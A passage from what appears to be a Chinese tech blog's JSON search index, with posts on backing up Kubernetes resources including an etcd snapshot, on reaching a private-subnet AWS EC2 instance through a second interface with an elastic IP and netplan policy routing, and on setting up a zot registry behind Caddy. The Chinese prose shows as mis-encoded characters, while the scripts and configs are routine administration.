class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--endpoints\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://10.10.240.3:2379 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cacert\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/ssl/etcd/ca.pem \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cert\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/ssl/etcd/etcd-client.pem \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--key\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/ssl/etcd/etcd-client-key.pem \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003esnapshot save \u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e/etcd-\u003cspan class=\"sb\"\u003e`\u003c/span\u003edate +%Y%m%d\u003cspan class=\"sb\"\u003e`\u003c/span\u003e-snapshot.db\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;====================================================\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;âœ… æ‰€æœ‰æŒ‡å®šèµ„æºå·²æˆåŠŸå¤‡ä»½åˆ°ç›®å½•: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;====================================================\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Kubernetesä¸‹å„ç§èµ„æºçš„æ¯æ—¥å®šæœŸå¤‡ä»½"},{"content":"ä»Šå¤©é¢è¯•äº†ä¸€ä¸‹ï¼Œé¢è¯•å®˜é—®åˆ°AWSçš„å­ç½‘é—®é¢˜ï¼Œæ¥è¯´è¯´AWSçš„æœ€ä½³å®è·µï¼š\né¦–å…ˆæ˜¯VPCçš„åˆ’å®šï¼Œç„¶åå°±æ˜¯ä¸‰ä¸ªpublicå­ç½‘ï¼Œä¸‰ä¸ªprivateå­ç½‘ï¼Œéƒ½æ˜¯ä¸€ä¸ªzoneåˆ†å¸ƒåœ¨aã€bã€cä¸‰ä¸ªä¸åŒæœºæˆ¿\næ¥ä¿è¯æœ€å¤§å†—ä½™æ€§ï¼Œç„¶åpubå­ç½‘é€šè¿‡IGWæ¥å‡ºå…¬ç½‘ï¼Œé‚£Privateå­ç½‘å°±é€šè¿‡NATå‡ºå…¬ç½‘ã€‚\nä½†æ˜¯ï¼Œä½†æ˜¯ï¼Œä½†æ˜¯ï¼š\nå¦‚æœä½ æŠŠä¸€å°EC2æœåŠ¡å™¨ä¸€å¼€å§‹å°±æ”¾é”™äº†å­ç½‘ï¼Œæ”¾åˆ°äº†privateå­ç½‘é‡Œï¼Œç„¶åä¸Šé¢åˆè·‘äº†é‡è¦çš„æœåŠ¡ï¼Œæ— æ³•è¿ç§»ï¼Œæ— æ³•é‡å¯ï¼Œè€Œä¸”æ•´ä¸ªvpcé‡Œåªæœ‰è¿™ä¸€å°ec2ï¼Œå…¶å®ƒä¸œè¥¿éƒ½æ˜¯awsçš„æœåŠ¡æˆ–è€…å¸‚åœºçš„æœåŠ¡åˆæˆ–è€…fargateã€lambdaä¹‹ç±»çš„æ— æœåŠ¡å™¨ï¼Œè¿™æ—¶å€™ä½ æƒ³è¿›å»è°ƒè¯•ï¼Œé‚£å°±éº»çƒ¦å¤§äº†\né‚£èƒ½ä¸èƒ½ç»™è¿™å°privateçš„æœºå™¨åŠ ä¸Šå…¬ç½‘ipæ¥å½“ä½œè·³æ¿æœºç›´æ¥è®¿é—®å‘¢ï¼Ÿ\nç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå¯ä»¥ã€‚\nä½†æ˜¯åˆæ¥äº†ï¼Œå¦‚æœè¿™ä¹ˆé…ç½®äº†ï¼Œä½ è¦å¯¹è·¯ç”±éå¸¸çš„ç†Ÿæ‚‰ï¼Œå› ä¸ºéšåå‘ç”Ÿé”™ä¹±çš„æƒ…å†µå¯èƒ½éœ€è¦ä½ æ‰‹åŠ¨æ·»åŠ è·¯ç”±ï¼Œæœ€éº»çƒ¦çš„ä¸æ˜¯é…ç½®ç½‘å¡ï¼Œè€Œæ˜¯é…ç½®è·¯ç”±ï¼\nåšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€åŠ¨æ€æ·»åŠ å¼¹æ€§ipåˆ°è¿™ä¸ªec2çš„ç¬¬äºŒä¸ªç½‘å¡\näºŒã€é…ç½®ç½‘ç»œ\n# vi /etc/netplan/50-cloud-init.yaml # This file is generated from information provided by the datasource. Changes # to it will not persist across an instance reboot. To disable cloud-init\u0026#39;s # network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} network: ethernets: enX0: addresses: - 10.0.132.169/20 #The private IP address of primary ENI nameservers: addresses: - 10.0.0.2 routes: - to: 0.0.0.0/0 via: 10.0.128.1 # Default gateway, you can find it using** ip r** command table: 1001 - to: 10.0.132.169 via: 0.0.0.0 scope: link table: 1001 routing-policy: - from: 10.0.132.169 table: 1001 dhcp4: no dhcp6: false match: macaddress: 06:36:82:ef:39:39 set-name: enX0 enX1: addresses: - 10.0.3.176/20 #The private IP address of primary ENI gateway4: 10.0.0.1 nameservers: addresses: - 8.8.8.8 - 1.1.1.1 routes: - to: 0.0.0.0/0 via: 10.0.0.1 # Default gateway, you can find it using** ip r** command table: 1002 - to: 10.0.3.176 via: 0.0.0.0 scope: link table: 1002 routing-policy: - from: 10.0.3.176 table: 1002 - from: 120.116.111.99 table: 1002 dhcp4: no dhcp6: false match: macaddress: 06:29:c3:b2:c5:f9 set-name: enX1 version: 2 netplan apply è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼ŒenX0æ˜¯privateå­ç½‘çš„ç½‘å¡ï¼ŒenX1æ˜¯å¼¹æ€§IPçš„ç½‘å¡ï¼Œæ³¨æ„ï¼Œå³ä½¿æ˜¯å¼¹æ€§IPï¼Œä¹Ÿæ˜¯ä¸ªå†…ç½‘åœ°å€ï¼Œè¿™ä¸¤ä¸ªIPå‘¢ï¼Œéƒ½æœ‰å„è‡ªç‹¬ç«‹çš„ç½‘å…³ï¼Œç¬¬äºŒä¸ªç½‘å¡è¿˜æœ‰è‡ªå·±çš„DNSã€‚è¿™å°±å®¹æ˜“å‘ç”Ÿé”™ä¹±äº†ï¼Œå› ä¸ºç¼ºçœè·¯ç”±èµ°ç¬¬ä¸€ä¸ªç½‘å¡ï¼Œé‚£å¦‚æœä»ç¬¬äºŒä¸ªç½‘å¡çš„å…¬ç½‘IPå…¥ï¼Œå‡ºçš„æ—¶å€™èµ°ç¬¬ä¸€å¼ ç½‘å¡ï¼Œé‚£å°±æœ‰æ„æ€äº†ã€‚\næ‰€ä»¥å“ªæ¥å›å“ªï¼Œæ¯ä¸ªç½‘å¡çš„ç¬¬äºŒä¸ªè·¯ç”±ï¼Œéƒ½æ˜¯è‡ªå·±èµ°è‡ªï¼Œç­–ç•¥è·¯ç”±çš„ç¬¬ä¸€è·³ï¼Œä¹Ÿæ˜¯è‡ªå·±èµ°è‡ªå·±ã€‚\nç„¶åç¬¬äºŒä¸ªç½‘å¡çš„ç¬¬äºŒæ¡ç­–ç•¥è·¯ç”±ï¼Œæ˜¯æŒ‡å®šçš„ï¼Œæœ¬è´¨æ„æ€å…¶å®æ˜¯ä»120.116.111.99è®¿é—®å¼¹æ€§å…¬ç½‘IPçš„wireguardæ•°æ®åŒ…ï¼Œå›ç¨‹çš„æ—¶å€™å¼ºåˆ¶æŒ‡å®šèµ°ç¬¬äºŒä¸ªç½‘å¡ã€‚\nç—›è‹¦å§ï¼\nè€Œä¸”è¿™å°EC2ä½œä¸ºè·³æ¿æœºï¼Œéœ€è¦ä»£ç†è®¿é—®AWSä¸­å„ç§æœåŠ¡ï¼Œè¿™æ ·å°±éº»çƒ¦äº†ï¼Œé‚£æ•°æ®åŒ…ç©¶ç«Ÿè¦ä»å“ªä¸ªç½‘å¡å‡ºå»ï¼Œä½ å¿…é¡»éå¸¸æ¸…æ¥šï¼Œå¦‚æœèµ°é”™äº†ï¼Œä½ å°±å¿…é¡»æ‰‹åŠ¨å¢åŠ è·¯ç”±è¡¨\nä»ç¬¬ä¸€å¼ ç½‘å¡æ˜¯awsçš„dnsæœåŠ¡å™¨ï¼Œæ˜¯å¯ä»¥è®¿é—®åˆ°å„ç§awsçš„å†…ç½‘endpointçš„è§£æåœ°å€çš„ï¼Œç¬¬äºŒå¼ ç½‘å¡ç”±äºæ˜¯å…¬ç½‘dnsæœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¸è¡Œï¼›å¦å¤–ç¬¬ä¸€å¼ ç½‘å¡æ˜¯ç¼ºçœè·¯ç”±ï¼›åŠ¡å¿…è°¨è®°è¿™ä¸¤ç‚¹ã€‚\nip route show table all ip rule show ip rule show table 1001 ip rule show table 1002 # æ‰‹åŠ¨æ–°å¢è·¯ç”± ip rule add from 120.116.111.99 table 1002 ip rule add to 120.116.111.99 table 1002 å­˜åœ¨å³åˆç†ï¼ŒAWSæœ¬è´¨ä¹Ÿæ˜¯é­”æ”¹äº†LInuxçš„å„ç§è½¯ä»¶å’ŒæœåŠ¡ã€‚\n","permalink":"https://rendoumi.com/posts/20251116-aws_private_public_ip/","summary":"\u003cp\u003eä»Šå¤©é¢è¯•äº†ä¸€ä¸‹ï¼Œé¢è¯•å®˜é—®åˆ°AWSçš„å­ç½‘é—®é¢˜ï¼Œæ¥è¯´è¯´AWSçš„æœ€ä½³å®è·µï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯VPCçš„åˆ’å®šï¼Œç„¶åå°±æ˜¯ä¸‰ä¸ªpublicå­ç½‘ï¼Œä¸‰ä¸ªprivateå­ç½‘ï¼Œéƒ½æ˜¯ä¸€ä¸ªzoneåˆ†å¸ƒåœ¨aã€bã€cä¸‰ä¸ªä¸åŒæœºæˆ¿\u003c/p\u003e\n\u003cp\u003eæ¥ä¿è¯æœ€å¤§å†—ä½™æ€§ï¼Œç„¶åpubå­ç½‘é€šè¿‡IGWæ¥å‡ºå…¬ç½‘ï¼Œé‚£Privateå­ç½‘å°±é€šè¿‡NATå‡ºå…¬ç½‘ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œä½†æ˜¯ï¼Œä½†æ˜¯ï¼š\u003c/p\u003e\n\u003cp\u003eå¦‚æœä½ æŠŠä¸€å°EC2æœåŠ¡å™¨ä¸€å¼€å§‹å°±æ”¾é”™äº†å­ç½‘ï¼Œæ”¾åˆ°äº†privateå­ç½‘é‡Œï¼Œç„¶åä¸Šé¢åˆè·‘äº†é‡è¦çš„æœåŠ¡ï¼Œæ— æ³•è¿ç§»ï¼Œæ— æ³•é‡å¯ï¼Œè€Œä¸”æ•´ä¸ªvpcé‡Œåªæœ‰è¿™ä¸€å°ec2ï¼Œå…¶å®ƒä¸œè¥¿éƒ½æ˜¯awsçš„æœåŠ¡æˆ–è€…å¸‚åœºçš„æœåŠ¡åˆæˆ–è€…fargateã€lambdaä¹‹ç±»çš„æ— æœåŠ¡å™¨ï¼Œè¿™æ—¶å€™ä½ æƒ³è¿›å»è°ƒè¯•ï¼Œé‚£å°±éº»çƒ¦å¤§äº†\u003c/p\u003e\n\u003cp\u003eé‚£èƒ½ä¸èƒ½ç»™è¿™å°privateçš„æœºå™¨åŠ ä¸Šå…¬ç½‘ipæ¥å½“ä½œè·³æ¿æœºç›´æ¥è®¿é—®å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå¯ä»¥ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯åˆæ¥äº†ï¼Œå¦‚æœè¿™ä¹ˆé…ç½®äº†ï¼Œä½ è¦å¯¹è·¯ç”±éå¸¸çš„ç†Ÿæ‚‰ï¼Œå› ä¸ºéšåå‘ç”Ÿé”™ä¹±çš„æƒ…å†µå¯èƒ½éœ€è¦ä½ æ‰‹åŠ¨æ·»åŠ è·¯ç”±ï¼Œæœ€éº»çƒ¦çš„ä¸æ˜¯é…ç½®ç½‘å¡ï¼Œè€Œæ˜¯é…ç½®è·¯ç”±ï¼\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€åŠ¨æ€æ·»åŠ å¼¹æ€§ipåˆ°è¿™ä¸ªec2çš„ç¬¬äºŒä¸ªç½‘å¡\u003c/p\u003e\n\u003cp\u003eäºŒã€é…ç½®ç½‘ç»œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/netplan/50-cloud-init.yaml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# This file is generated from information provided by the datasource.  Changes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# to it will not persist across an instance reboot.  To disable cloud-init\u0026#39;s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# network configuration capabilities, write a file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# network: {config: disabled}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ethernets:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        enX0:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              - 10.0.132.169/20 \u003cspan class=\"c1\"\u003e#The private IP address of primary ENI\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nameservers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                - 10.0.0.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 0.0.0.0/0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 10.0.128.1 \u003cspan class=\"c1\"\u003e# Default gateway, you can find it using** ip r** command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1001\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 10.0.132.169\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               scope: link\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routing-policy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - from: 10.0.132.169\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp4: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp6: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            match:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                macaddress: 06:36:82:ef:39:39\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            set-name: enX0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        enX1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              - 10.0.3.176/20 \u003cspan class=\"c1\"\u003e#The private IP address of primary ENI\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gateway4: 10.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nameservers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              addresses:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                - 8.8.8.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                - 1.1.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 0.0.0.0/0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 10.0.0.1 \u003cspan class=\"c1\"\u003e# Default gateway, you can find it using** ip r** command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - to: 10.0.3.176\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               via: 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               scope: link\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            routing-policy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - from: 10.0.3.176\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             - from: 120.116.111.99\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               table: \u003cspan class=\"m\"\u003e1002\u003c/span\u003e             \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp4: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            dhcp6: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            match:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                macaddress: 06:29:c3:b2:c5:f9\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            set-name: enX1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    version: \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetplan apply\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼ŒenX0æ˜¯privateå­ç½‘çš„ç½‘å¡ï¼ŒenX1æ˜¯å¼¹æ€§IPçš„ç½‘å¡ï¼Œæ³¨æ„ï¼Œå³ä½¿æ˜¯å¼¹æ€§IPï¼Œä¹Ÿæ˜¯ä¸ªå†…ç½‘åœ°å€ï¼Œè¿™ä¸¤ä¸ªIPå‘¢ï¼Œéƒ½æœ‰å„è‡ªç‹¬ç«‹çš„ç½‘å…³ï¼Œç¬¬äºŒä¸ªç½‘å¡è¿˜æœ‰è‡ªå·±çš„DNSã€‚è¿™å°±å®¹æ˜“å‘ç”Ÿé”™ä¹±äº†ï¼Œå› ä¸ºç¼ºçœè·¯ç”±èµ°ç¬¬ä¸€ä¸ªç½‘å¡ï¼Œé‚£å¦‚æœä»ç¬¬äºŒä¸ªç½‘å¡çš„å…¬ç½‘IPå…¥ï¼Œå‡ºçš„æ—¶å€™èµ°ç¬¬ä¸€å¼ ç½‘å¡ï¼Œé‚£å°±æœ‰æ„æ€äº†ã€‚\u003c/p\u003e","title":"AWS æ”¾é”™åœ¨Privateå­ç½‘çš„æœºå™¨å¦‚ä½•ç”¨å…¬ç½‘IPè¿è¿›å»"},{"content":"æœåŠ¡å™¨åœ¨HKï¼Œä½†æ˜¯å»æ‹‰å–è…¾è®¯å¹¿å·Dockeré•œåƒä»“çš„æ—¶å€™æ€»æ˜¯å¤±è´¥ï¼Œè¿˜æ˜¯ä¼ä¸šç‰ˆï¼Œå¤§æ— è¯­äº†ã€‚\næ²¡åŠæ³•ï¼Œè¢«é€¼æ— å¥ˆï¼Œå¹²è„†åœ¨HKå»ºä¸€ä¸ªé•œåƒä»“ï¼Œç„¶åæ¨é€åˆ°é‚£é‡Œï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†ã€‚\nåˆšå¼€å§‹çš„æƒ³æ³•æ˜¯ç”¨Harborï¼Œä½†æ˜¯Harborå®åœ¨å¤ªæ²‰é‡äº†ï¼Œè€Œä¸”Harborçš„æœ€å¤§é—®é¢˜æ˜¯è¿‡æœŸé•œåƒæ¸…ç†ï¼Œå¦‚æœè¿‡æœŸé•œåƒå‡ºé”™äº†ï¼Œé‚£æ˜¯æ¸…ç†ä¸æ‰çš„ï¼Œé™¤éé‡æ–°æ‰“åŒ…ä¸Šä¼ è¦†ç›–æ‰é”™è¯¯çš„é•œåƒï¼Œç„¶åå†åˆ é™¤æ‰å¯ä»¥ï¼Œä½†é—®é¢˜æ˜¯å¦‚æœæœ‰700ã€800ä¸ªé”™çš„é•œåƒï¼Œé‚£æ˜¯çœŸæ²¡æœ‰é‚£ä¸ªåŠ²å»æ¸…ç†äº†ã€‚\né‚£è¿™æ¬¡å°±æƒ³å»ºä¸ªè½»é‡çº§çš„ï¼Œå¹²è„†è¿WEBç•Œé¢éƒ½ä¸è¦ï¼Œåªè¦docker loginåèƒ½pushå’Œpullå³å¯ï¼\nè¿™æ ·çš„è¯zotæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œzotæ˜¯å…¼å®¹ociæ ‡å‡†çš„ï¼ŒæŸäº›åœ°æ–¹è·Ÿdockeræ˜¯ä¸å…¼å®¹çš„ï¼š\nä¸‹è½½zot\nwget https://github.com/project-zot/zot/releases/download/v2.1.10/zot-linux-amd64 å‡†å¤‡é…ç½®æ–‡ä»¶\ncat \u0026gt;/usr/local/bin/config.json \u0026lt;\u0026lt; EOF { \u0026#34;distSpecVersion\u0026#34;: \u0026#34;1.0.0-dev\u0026#34;, \u0026#34;http\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: \u0026#34;5000\u0026#34;, \u0026#34;compat\u0026#34;: [\u0026#34;docker2s2\u0026#34;], \u0026#34;auth\u0026#34;: { \u0026#34;htpasswd\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/usr/local/bin/htpasswd\u0026#34; } } }, \u0026#34;storage\u0026#34;: { \u0026#34;rootDirectory\u0026#34;: \u0026#34;/data/registry\u0026#34; } } EOF æ³¨æ„ä¸Šé¢compatï¼Œå¦‚æœä¸é…ç½®ï¼Œå°±ä¼šå‡ºç°pushçš„æ—¶å€™å‡ºç°manifest invalidé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºdockerå’Œociçš„æ ‡å‡†ä¸åŒï¼Œzotæ˜¯éµå¾ªociæ ‡å‡†çš„\nå‡†å¤‡htpasswdï¼Œå¿…é¡»ç”¨bcryptçš„æ–¹å¼ï¼Œzotä¸æ”¯æŒå…¶å®ƒçš„ï¼\n-B Force bcrypt hashing of the password (very secure) htpasswd -B -c /usr/local/bin/htpasswd user01 å‡†å¤‡zot.service\ncat \u0026gt; /etc/systemd/system/zot.service \u0026lt;\u0026lt; EOF [Unit] After=network.target nss-lookup.target [Service] User=root ExecStart=/usr/local/bin/zot-linux-amd64 serve /usr/local/bin/config.json Restart=on-failure RestartSec=10s LimitNOFILE=infinity [Install] WantedBy=multi-user.target EOF é‚£å¤§å®¶æ³¨æ„åˆ°äº†ï¼Œzotåªç›‘å¬åˆ°äº†127.0.0.1:5000ï¼Œæ‰€ä»¥å‰é¢è¿˜éœ€è¦ç”¨caddyä»£ç†ä¸€ä¸‹\nå‡†å¤‡caddyçš„é…ç½®æ–‡ä»¶\ncat \u0026gt; /usr/local/bin/Caddyfile \u0026lt;\u0026lt; EOF registry.rendoumi.com { reverse_proxy 127.0.0.1:5000 { header_up X-Real-IP {remote_host} transport http { dial_timeout 15s response_header_timeout 300s } } } EOF å‡†å¤‡caddyçš„systemdæ–‡ä»¶\ncat \u0026gt; /etc/systemd/system/caddy.service \u0026lt;\u0026lt; EOF 